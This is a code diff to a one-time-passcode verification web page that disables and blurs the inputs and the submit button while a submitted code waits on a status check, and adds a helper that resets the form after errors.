@@ -89,6 +89,13 @@
             font-size: 20px;
             border: 1px solid #e2e8f0;
             border-radius: 6px;
+            transition: all 0.3s ease;
+        }
+
+        .otp-inputs input.blurred {
+            filter: blur(2px);
+            opacity: 0.7;
+            pointer-events: none;
         }
         
         .otp-inputs input:focus {
@@ -106,11 +113,17 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s;
+            transition: all 0.3s ease;
             margin-top: 20px;
         }
+
+        .submit-btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+            filter: blur(1px);
+        }
         
-        .submit-btn:hover {
+        .submit-btn:hover:not(:disabled) {
             background-color: #333333;
         }
         
@@ -176,7 +189,7 @@
                 
                 <div class="throbber" id="otpThrobber"></div>
                 
-                <button type="submit" class="submit-btn">Verify</button>
+                <button type="submit" class="submit-btn" id="submitBtn" disabled>Verify</button>
             </form>
         </div>
     </div>
@@ -192,21 +205,28 @@
             const otpThrobber = document.getElementById('otpThrobber');
             const errorMessage = document.getElementById('errorMessage');
             const successMessage = document.getElementById('successMessage');
+            const submitBtn = document.getElementById('submitBtn');
             
             let checkStatusInterval;
             
             // Auto-focus first input
             otpInputs[0].focus();
             
-            // Handle input navigation
+            // Handle input navigation and enable/disable submit button
             otpInputs.forEach((input, index) => {
                 input.addEventListener('input', function() {
                     errorMessage.style.display = 'none';
+                    
+                    // Move to next input if current has value
                     if (this.value.length === 1) {
                         if (index < otpInputs.length - 1) {
                             otpInputs[index + 1].focus();
                         }
                     }
+                    
+                    // Check if all inputs are filled
+                    const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+                    submitBtn.disabled = !allFilled;
                 });
                 
                 input.addEventListener('keydown', function(e) {
@@ -223,9 +243,14 @@
             otpForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 
-                // Show loading spinner
+                // Show loading state
                 otpThrobber.style.display = 'block';
                 errorMessage.style.display = 'none';
+                submitBtn.disabled = true;
+                otpInputs.forEach(input => {
+                    input.classList.add('blurred');
+                    input.disabled = true;
+                });
                 
                 // Combine OTP digits
                 const otp = Array.from(otpInputs).map(input => input.value).join('');
@@ -233,7 +258,7 @@
                 // Basic client-side validation
                 if (otp.length !== 6 || !/^\d+$/.test(otp)) {
                     showError('Please enter a valid 6-digit code');
-                    otpThrobber.style.display = 'none';
+                    resetFormState();
                     return;
                 }
                 
@@ -249,11 +274,12 @@
                         method: 'POST',
                         body: formData
                     });
+                    
+                    // Keep throbber spinning while waiting for status update
+                    
                 } catch (error) {
-                    // Silently handle any network errors
                     console.error('Submission error:', error);
-                } finally {
-                    otpThrobber.style.display = 'none';
+                    // Silently handle error - we'll rely on status checker
                 }
             });
             
@@ -288,6 +314,7 @@
             }
             
             function showError(message) {
+                resetFormState();
                 errorMessage.textContent = message;
                 errorMessage.style.display = 'block';
                 otpInputs.forEach(input => input.value = '');
@@ -298,6 +325,19 @@
                 successMessage.textContent = message;
                 successMessage.style.display = 'block';
                 otpForm.style.display = 'none';
+            }
+            
+            function resetFormState() {
+                otpThrobber.style.display = 'none';
+                submitBtn.disabled = false;
+                otpInputs.forEach(input => {
+                    input.classList.remove('blurred');
+                    input.disabled = false;
+                });
+                
+                // Re-check if all inputs are filled to determine submit button state
+                const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+                submitBtn.disabled = !allFilled;
             }
             
             // Clean up interval when leaving page
